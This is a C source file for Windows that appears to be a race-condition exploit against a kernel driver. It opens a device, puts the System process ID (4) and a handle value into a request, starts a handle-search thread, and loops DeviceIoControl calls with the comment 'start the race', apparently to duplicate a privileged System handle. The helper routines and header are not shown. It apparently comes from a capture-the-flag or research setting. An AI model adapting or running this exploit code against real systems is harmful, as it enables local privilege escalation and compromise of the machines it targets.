#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include "LMI-Common.h"

void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		}
		else {
			ascii[i % 16] = '.';
		}
		if ((i + 1) % 8 == 0 || i + 1 == size) {
			printf(" ");
			if ((i + 1) % 16 == 0) {
				printf("|  %s \n", ascii);
			}
			else if (i + 1 == size) {
				ascii[(i + 1) % 16] = '\0';
				if ((i + 1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i + 1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

int main() {
	LMI_INFO lmii = { 0 };
	lmii.qwPid = 4;
	lmii.handleValue = 0xf0;
	DWORD dwHandleCount = 0;
	DWORD64 hBegin = 0;
	BOOL bFound = FALSE;
	BOOL bRes = FALSE;
	HANDLE hHeap = GetProcessHeap();
	HANDLE hThreads[5] = { 0 };
	SHITTY_THREAD_INFO sti = { 0 };
	DWORD dwBytesReturned = 0;
	LPVOID lpOutBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000);


	BOOL bIsSet = FALSE;

	if (!lpOutBuf) {
		printf("HeapAlloc : %lx\n", GetLastError());
		return -1;
	}

	char* strFileName = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x300);
	if (!strFileName) {
		printf("HeapAlloc : %lx\n", GetLastError());
		return -1;
	}

	HANDLE hSysProc = 0;

	printf("hCurProc = %p\n", g_hCurrentProc);
 
	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (!hNtdll) {
		printf("Could not get handle to ntdll");
		return -1;
	}

	const char* strDevName = R"(\\.\0123456789abcdef123456789abcdef)";
	HANDLE hDevice = CreateFileA(
		strDevName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);


	if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
		printf("CreateFileA : %lx\n", GetLastError());
		return -1;
	}
	
	DWORD dwTid = 0;

	CreateThread(NULL, 0x1000, (LPTHREAD_START_ROUTINE)HandleSearchThread, NULL, NULL, &dwTid);
	
	while (TRUE) {
		// call DeviceIoControl to start the race
		bRes = DeviceIoControl(
			hDevice,
			IOCTL_DUPE_LEL,
			&lmii,
			sizeof(LMI_INFO),
			lpOutBuf,
			0x1000,
			&dwBytesReturned,
			NULL
		);
	}

	if (!bRes) {
		printf("DeviceIoControl Failed - %lx\n", GetLastError());
	}


	return 0;
}